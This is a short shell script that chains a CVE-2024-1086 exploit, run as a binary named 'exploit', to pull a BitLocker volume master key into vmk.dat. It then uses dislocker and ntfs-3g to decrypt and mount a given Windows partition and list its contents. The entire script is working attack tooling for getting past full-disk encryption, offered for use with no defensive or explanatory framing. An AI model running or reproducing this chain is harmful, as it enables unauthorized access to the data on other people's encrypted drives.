#!/bin/ash

echoInfo () {
    echo -e "\e[34;1m[+]\e[0m \e[34mInfo: $1\e[0m" >&2
}

if [ "$1" = "" ]
then
  echoInfo "Usage: $0 <partition>"
  echoInfo "(usually something like /dev/sda3)"
  exit
fi

PARTITION=$1

# run CVE-2024-1086 exploit
echoInfo "Exploiting CVE-2024-1086 and obtaining VMK..."
exploit
echoInfo "VMK saved in vmk.dat!"

# decrypt and mount the file system
echoInfo "Unlocking Bitlocker partition..."
modprobe fuse
mkdir bitlocker
dislocker -V $PARTITION -K vmk.dat -vvv -- bitlocker
mkdir mnt
mount -t ntfs-3g -o loop /root/bitlocker/dislocker-file /root/mnt
echoInfo "Mounted partition into /root/mnt!"
ls /root/mnt
echo ""
echoInfo "Don't forget to unmount using umount /root/mnt!"
